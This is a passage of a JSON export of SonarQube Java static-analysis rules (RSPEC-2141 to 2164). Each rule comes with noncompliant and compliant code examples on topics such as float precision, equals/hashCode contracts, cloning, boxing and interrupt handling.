1.6777217E7\n\ndouble d = a + b; // Noncompliant; addition is still between 2 floats\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfloat a = 16777216.0f;\nfloat b = 1.0f;\nBigDecimal c = BigDecimal.valueOf(a).add(BigDecimal.valueOf(b));\n\ndouble d = (double)a + (double)b;\n</pre>\n<h3>Exceptions</h3>\n<p>This rule doesnât raise an issue when the mathematical expression is only used to build a string.</p>\n<pre>\nSystem.out.println(\"[\"+getName()+\"] \" +\n           \"\\n\\tMax time to retrieve connection:\"+(max/1000f/1000f)+\" ms.\");\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/CtcxBQ\">CERT, FLP02-C.</a> - Avoid using floating-point numbers when precise computation is\n  needed </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2164","summary":"Math should not be performed on floats","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A key facet of the <code>equals</code> contract is that if <code>a.equals(b)</code> then <code>b.equals(a)</code>, i.e. that the relationship is\nsymmetric.</p>\n<p>Using <code>instanceof</code> breaks the contract when there are subclasses, because while the child is an <code>instanceof</code> the parent, the\nparent is not an <code>instanceof</code> the child. For instance, assume that <code>Raspberry extends Fruit</code> and adds some fields (requiring a\nnew implementation of <code>equals</code>):</p>\n<pre>\nFruit fruit = new Fruit();\nRaspberry raspberry = new Raspberry();\n\nif (raspberry instanceof Fruit) { ... } // true\nif (fruit instanceof Raspberry) { ... } // false\n</pre>\n<p>If similar <code>instanceof</code> checks were used in the classes' <code>equals</code> methods, the symmetry principle would be broken:</p>\n<pre>\nraspberry.equals(fruit); // false\nfruit.equals(raspberry); //true\n</pre>\n<p>Additionally, non <code>final</code> classes shouldnât use a hardcoded class name in the <code>equals</code> method because doing so breaks the\nmethod for subclasses. Instead, make the comparison dynamic.</p>\n<p>Further, comparing to an unrelated class type breaks the contract for that unrelated type, because while\n<code>thisClass.equals(unrelatedClass)</code> can return true, <code>unrelatedClass.equals(thisClass)</code> will not.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Fruit extends Food {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (obj == null) {\n      return false;\n    }\n    if (Fruit.class == obj.getClass()) { // Noncompliant; broken for child classes\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    if (obj instanceof Fruit ) {  // Noncompliant; broken for child classes\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    else if (obj instanceof Season) { // Noncompliant; symmetry broken for Season class\n      // ...\n    }\n    //...\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Fruit extends Food {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (obj == null) {\n      return false;\n    }\n    if (this.getClass() == obj.getClass()) {\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    return false;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/AzZGBQ\">CERT, MET08-J.</a> - Preserve the equality contract when overriding the equals() method\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2162","summary":"\"equals\" methods should be symmetric and work for subclasses","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule raises an issue when a subclass of a class that overrides <code>Object.equals</code> introduces new fields but does not also override the\n<code>Object.equals</code> method.</p>\n<h2>Why is this an issue?</h2>\n<p>When a class overrides <code>Object.equals</code>, this indicates that the class not just considers object identity as equal (the default\nimplementation of <code>Object.equals</code>) but implements another logic for what is considered equal in the context of this class. Usually (but not\nnecessarily), the semantics of <code>equals</code> in this case is that two objects are equal when their state is equal field by field.</p>\n<p>Because of this, adding new fields to a subclass of a class that overrides <code>Object.equals</code> but not updating the implementation of\n<code>equals</code> in the subclass is most likely an error.</p>\n<h2>How to fix it</h2>\n<p>Consider the following example:</p>\n<pre>\nclass Foo {\n\n  final int a;\n\n  @Override\n  public boolean equals(Object other) {\n    if (other == null) return false;\n    if (getClass() != other.getClass()) return false;\n    return a == ((Foo) other).a;\n  }\n}\n</pre>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Bar extends Foo { // Noncompliant, `equals` ignores the value of `b`\n  final int b;\n}\n</pre>\n<p>Override the <code>equals</code> method in the subclass to incorporate the new fields into the comparison:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Bar extends Foo { // Compliant, `equals` now also considers `b`\n\n  final int b;\n\n  @Override\n  public boolean equals(Object other) {\n    if (!super.equals(other)) return false;\n    return b == ((Bar) other).b;\n  }\n}\n</pre>\n<p>In case the new fields should not be part of the comparison because they are, for example, auxiliary variables not contributing to the object value\n(), still override the method to make the point clear that this was not just forgotten:</p>\n<pre>\nclass Bar extends Foo { // Compliant, we do explicitly not want to take `b` into account\n\n  final int b;\n\n  @Override\n  public boolean equals(Object other) {\n    return super.equals(other);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#equals-java.lang.Object-\">Object.equals - Java SE 8 API\n  Specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2160","summary":"Subclasses that add fields to classes that override \"equals\" should also override \"equals\"","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>\n<ul>\n  <li> comparing an object with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>\n  <li> comparing unrelated <code>interface</code> types </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays </li>\n</ul>\n<p>Specifically in the case of arrays, since arrays donât override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same\nas comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>\n<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for\ninstance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be\nused with arrays.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ninterface KitchenTool { ... };\ninterface Plant {...}\n\npublic class Spatula implements KitchenTool { ... }\npublic class Tree implements Plant { ...}\n//...\n\nSpatula spatula = new Spatula();\nKitchenTool tool = spatula;\nKitchenTool [] tools = {tool};\n\nTree tree = new Tree();\nPlant plant = tree;\nTree [] trees = {tree};\n\n\nif (spatula.equals(tree)) { // Noncompliant; unrelated classes\n  // ...\n}\nelse if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface\n  // ...\n}\nelse if (tool.equals(plant)) { // Noncompliant; unrelated interfaces\n  // ...\n}\nelse if (tool.equals(tools)) { // Noncompliant; array &amp; non-array\n  // ...\n}\nelse if (trees.equals(tools)) { // Noncompliant; incompatible arrays\n  // ...\n}\nelse if (tree.equals(null)) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5zdGBQ\">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two arrays </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2159","summary":"Unnecessary equality checks should not be made","tags":["cert","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue when a class implements the interface <code>java.lang.Cloneable</code>, but does not override the\n<code>Object.clone()</code> method.</p>\n<h2>Why is this an issue?</h2>\n<p><code>Cloneable</code> is a <em>marker interface</em> that defines the contract of the <code>Object.clone</code> method, which is to create a\nconsistent copy of the instance. The <code>clone</code> method is not defined by the interface though, but by class <code>Objects</code>.</p>\n<p>The general problem with marker interfaces is that their definitions cannot be enforced by the compiler because they have no own API. When a class\nimplements <code>Cloneable</code> but does not override <code>Object.clone</code>, it is highly likely that it violates the contract for\n<code>Cloneable</code>.</p>\n<h2>How to fix it</h2>\n<p>Consider the following example:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Foo implements Cloneable { // Noncompliant, override `clone` method\n  public int value;\n}\n</pre>\n<p>Override the <code>clone</code> method in class <code>Foo</code>. By convention, it must call <code>super.clone()</code>. At this point, we know\nthat:</p>\n<ul>\n  <li> By behavioral contract, <code>Object.clone</code> will not throw a <code>CloneNotSupportedException</code>, because <code>Foo</code> implements\n  <code>Cloneable</code>. </li>\n  <li> The returned object is an instance of class <code>Foo</code> </li>\n</ul>\n<p>We can narrow down the return type of <code>clone</code> to <code>Foo</code> and handle the <code>CloneNotSupportedException</code> inside the\nfunction instead of throwing it:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Foo implements Cloneable { // Compliant\n\n  public int value;\n\n  @Override\n  public Foo clone() {\n    try {\n      return (Foo) super.clone();\n    } catch (CloneNotSupportedException e) {\n      throw new AssertionError();\n    }\n  }\n}\n</pre>\n<p>Be aware that <code>super.clone()</code> returns a one-by-one copy of the fields of the original instance. This means that in our example, the\n<code>Foo.value</code> field is not required to be explicitly copied in the overridden function.</p>\n<p>If you require another copy behavior for some or all of the fields, for example, deep copy or certain invariants that need to be true for a field,\nthese fields must be patched after <code>super.clone()</code>:</p>\n<pre>\nclass Entity implements Cloneable {\n\n  public int id; // unique per instance\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  @Override\n  public Entity clone() {\n    try {\n      Entity copy = (Entity) super.clone();\n      copy.id = System.identityHashCode(this);\n      copy.children = children.stream().map(Entity::clone).toList();\n      return copy;\n    } catch (CloneNotSupportedException e) {\n      throw new AssertionError();\n    }\n  }\n}\n</pre>\n<p>Be aware that the <code>Cloneable</code> / <code>Object.clone</code> approach has several drawbacks. You might, therefore, also consider resorting\nto other solutions, such as a custom <code>copy</code> method or a copy constructor:</p>\n<pre>\nclass Entity implements Cloneable {\n\n  public int id; // unique per instance\n  public List&lt;Entity&gt; children; // deep copy wanted\n\n  Entity(Entity template) {\n    id = System.identityHashCode(this);\n    children = template.children.stream().map(Entity::new).toList();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Cloneable.html\">Interface Cloneable - Javaâ¢ Platform, Standard Edition 8 API\n  Specification</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#clone--\">Object.clone - Javaâ¢ Platform, Standard Edition 8 API\n  Specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2157","summary":"\"Cloneables\" should implement \"clone\"","tags":["convention","api-design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>\nmembers, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a\n<code>final</code> class <code>protected</code> is confusingly pointless.</p>\n<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this\ncould lead to accidental, unintended access to otherwise private members.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic final class MyFinalClass {\n\n  protected String name = \"Fred\";  // Noncompliant\n  protected void setName(String name) {  // Noncompliant\n    // ...\n  }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic final class MyFinalClass {\n\n  private String name = \"Fred\";\n  public void setName(String name) {\n    // ...\n  }\n</pre>\n<h3>Exceptions</h3>\n<p>Members annotated with&nbsp;<code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed to\nmake the code testable.</p>\n<pre>\npublic final class MyFinalClass {\n  @VisibleForTesting\n  protected Logger logger; // Compliant\n\n  @VisibleForTesting\n  protected int calculateSomethingComplex(String input) { // Compliant\n    // ...\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2156","summary":"\"final\" classes should not have \"protected\" members","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using boxed values in a ternary operator does not simply return one operand or the other based on the condition. Instead, the values are unboxed\nand coerced to a common type, which can result in a loss of precision when converting one operand from <code>int</code> to <code>float</code> or from\n<code>long</code> to <code>double</code>.</p>\n<p>While this behavior is expected for arithmetic operations, it may be unexpected for the ternary operator. To avoid confusion or unexpected\nbehavior, cast to a compatible type explicitly.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Cast one of both operands to a common supertype (e.g., <code>Number</code>) to prevent auto-unboxing and, thus, type coercion.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n1 = condition ? i : f;  // Noncompliant, unexpected precision loss, n1 = 1.23456792E8\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n1 = condition ? (Number) i : f; // Compliant, cast to Number prevents unboxing\nNumber n2 = condition ? i : (Number) f; // Compliant, cast to Number prevents unboxing\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If type coercion was your intention, clarify this by casting the operand that would be coerced to the corresponding type explicitly.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n1 = condition ? i : f;  // Noncompliant, unexpected precision loss, n1 = 1.23456792E8\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? (float) i : f; // Compliant, intentional type coercion with precision loss\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/op2.html\">The Java Tutorials: Equality, Relational, and Conditional\n  Operators</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html\">The Java Tutorials: Autoboxing and Unboxing</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html\">The JavaÂ® Language Specification Java SE 7 Edition: Chapter 5.\n  Conversions and Promotions</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.geeksforgeeks.org/coercion-in-java/\">GeeksforGeeks: Coercion in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2154","summary":"Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Boxing is the process of putting a primitive value into a wrapper object, such as creating an <code>Integer</code> to hold an <code>int</code>\nvalue. Unboxing is the process of retrieving the primitive value from such an object. Since the original value is unchanged during boxing and\nunboxing, there is no point in doing either when not needed.</p>\n<p>Instead, you should rely on Javaâs implicit boxing/unboxing to convert from the primitive type to the wrapper type and vice versa, for better\nreadability.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void examinePrimitiveInt(int a) {\n  //...\n}\n\npublic void examineBoxedInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int primitiveInt = 0;\n  Integer boxedInt = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = Double.valueOf(d).intValue(); // Noncompliant; should be replaced with a simple cast\n\n  examinePrimitiveInt(boxedInt.intValue()); // Noncompliant; unnecessary unboxing\n  examinePrimitiveInt(Integer.valueOf(primitiveInt));  // Noncompliant; boxed int will be auto-unboxed\n\n  examineBoxedInteger(Integer.valueOf(primitiveInt)); // Noncompliant; unnecessary boxing\n  examineBoxedInteger(boxedInt.intValue()); // Noncompliant; unboxed int will be autoboxed\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void examinePrimitiveInt(int a) {\n  //...\n}\n\npublic void examineBoxedInteger(Integer a) {\n  // ...\n}\n\npublic void func() {\n  int primitiveInt = 0;\n  Integer boxedInt = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = (int) d;\n\n  examinePrimitiveInt(primitiveInt);\n  examinePrimitiveInt(boxedInt);\n\n  examineBoxedInteger(primitiveInt);\n  examineBoxedInteger(boxedInt);\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2153","summary":"Unnecessary boxing and unboxing should be avoided","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Enabling <code>runFinalizersOnExit</code> is unsafe as it might result in erratic behavior and deadlocks on application exit.</p>\n<p>Indeed, finalizers might be force-called on live objects while other threads are concurrently manipulating them.</p>\n<p>Instead, if you want to execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void main(String [] args) {\n  System.runFinalizersOnExit(true);  // Noncompliant\n}\n\nprotected void finalize(){\n  doShutdownOperations();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static void main(String [] args) {\n  Thread myThread = new Thread( () -&gt; { doShutdownOperations(); });\n  Runtime.getRuntime().addShutdownHook(myThread);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2151","summary":"\"runFinalizersOnExit\" should not be called","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Beginning with Java 7, it is possible to add underscores ('_') to numeric literals to enhance readability. The addition of underscores in this\nmanner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>\n<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Base</th>\n      <th>Minimum digits</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>binary</p></td>\n      <td><p>9</p></td>\n    </tr>\n    <tr>\n      <td><p>octal</p></td>\n      <td><p>9</p></td>\n    </tr>\n    <tr>\n      <td><p>decimal</p></td>\n      <td><p>6</p></td>\n    </tr>\n    <tr>\n      <td><p>hexadecimal</p></td>\n      <td><p>9</p></td>\n    </tr>\n  </tbody>\n</table>\n<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint i = 10000000;  // Noncompliant; is this 10 million or 100 million?\nint  j = 0b01101001010011011110010101011110;  // Noncompliant\nlong l = 0x7fffffffffffffffL;  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint i = 10_000_000;\nint  j = 0b01101001_01001101_11100101_01011110;\nlong l = 0x7fff_ffff_ffff_ffffL;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2148","summary":"Underscores should be used to make large numbers readable","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they\nshould be combined for better readability.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ncatch (IOException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (SQLException e) {  // Noncompliant\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {  // Compliant; block contents are different\n  doCleanup();\n  throw e;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ncatch (IOException|SQLException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {\n  doCleanup();\n  throw e;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2147","summary":"Catches should be combined","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"DISTINCT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in\na multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8âs JSR 310\nimplementation offers specific classes for:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Class</th>\n      <th>Use for</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>LocalDate</p></td>\n      <td><p>a date, without time of day, offset, or zone</p></td>\n    </tr>\n    <tr>\n      <td><p>LocalTime</p></td>\n      <td><p>the time of day, without date, offset, or zone</p></td>\n    </tr>\n    <tr>\n      <td><p>LocalDateTime</p></td>\n      <td><p>the date and time, without offset, or zone</p></td>\n    </tr>\n    <tr>\n      <td><p>OffsetDate</p></td>\n      <td><p>a date with an offset such as +02:00, without time of day, or zone</p></td>\n    </tr>\n    <tr>\n      <td><p>OffsetTime</p></td>\n      <td><p>the time of day with an offset such as +02:00, without date, or zone</p></td>\n    </tr>\n    <tr>\n      <td><p>OffsetDateTime</p></td>\n      <td><p>the date and time with an offset such as +02:00, without a zone</p></td>\n    </tr>\n    <tr>\n      <td><p>ZonedDateTime</p></td>\n      <td><p>the date and time with a time zone and offset</p></td>\n    </tr>\n    <tr>\n      <td><p>YearMonth</p></td>\n      <td><p>a year and month</p></td>\n    </tr>\n    <tr>\n      <td><p>MonthDay</p></td>\n      <td><p>month and day</p></td>\n    </tr>\n    <tr>\n      <td><p>Year/MonthOfDay/DayOfWeek/â¦â</p></td>\n      <td><p>classes for the important fields</p></td>\n    </tr>\n    <tr>\n      <td><p>DateTimeFields</p></td>\n      <td><p>stores a map of field-value pairs which may be invalid</p></td>\n    </tr>\n    <tr>\n      <td><p>Calendrical</p></td>\n      <td><p>access to the low-level API</p></td>\n    </tr>\n    <tr>\n      <td><p>Period</p></td>\n      <td><p>a descriptive amount of time, such as \"2 months and 3 days\"</p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\nDate now = new Date();  // Noncompliant\nDateFormat df = new SimpleDateFormat(\"dd.MM.yyyy\");\nCalendar christmas  = Calendar.getInstance();  // Noncompliant\nchristmas.setTime(df.parse(\"25.12.2020\"));\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nLocalDate now = LocalDate.now();  // gets calendar date. no time component\nLocalTime now2 = LocalTime.now(); // gets current time. no date component\nLocalDate christmas = LocalDate.of(2020,12,25);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2143","summary":"\"java.time\" classes should be used for dates and times","tags":["java8","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>If an <code>InterruptedException</code> or a <code>ThreadDeath</code> error is not handled properly, the information that the thread was\ninterrupted will be lost. Handling this exception means either to re-throw it or manually re-interrupt the current thread by calling\n<code>Thread.interrupt()</code>. Simply logging the exception is not sufficient and counts as ignoring it. Between the moment the exception is caught\nand handled, is the right time to perform cleanup operations on the methodâs state, if needed.</p>\n<h3>What is the potential impact?</h3>\n<p>Failing to interrupt the thread (or to re-throw) risks delaying the thread shutdown and losing the information that the thread was interrupted -\nprobably without finishing its task.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void run () {\n  try {\n    /*...*/\n  } catch (InterruptedException e) { // Noncompliant; logging is not enough\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void run () {\n  try {\n    /* ... */\n  } catch (InterruptedException e) { // Compliant; the interrupted state is restored\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n    /* Clean up whatever needs to be handled before interrupting  */\n    Thread.currentThread().interrupt();\n  }\n}\n\npublic void run () {\n  try {\n    /* ... */\n  } catch (ThreadDeath e) { // Compliant; the error is being re-thrown\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n    /* Clean up whatever needs to be handled before re-throwing  */\n    throw e;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/391\">CWE-391 - Unchecked Error Condition</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2142","summary":"\"InterruptedException\" and \"ThreadDeath\" should not be ignored","tags":["cwe","error-handling","multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define\n<code>equals(Object)</code> but not <code>hashCode()</code> arenât truly hash-able because instances that are equivalent according to the\n<code>equals</code> method can return different hashes.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Student {  // no hashCode() method; not hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = // okay so far\n          new HashTable&lt;Student, Integer&gt;(); // Noncompliant\n\n  // ...\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Student {  // has hashCode() method; hash-able\n  // ...\n\n  public boolean equals(Object o) {\n    // ...\n  }\n  public int hashCode() {\n    // ...\n  }\n}\n\npublic class School {\n  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();\n\n  // ...\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2141","summary":"Classes that don't define \"hashCode()\" should not be 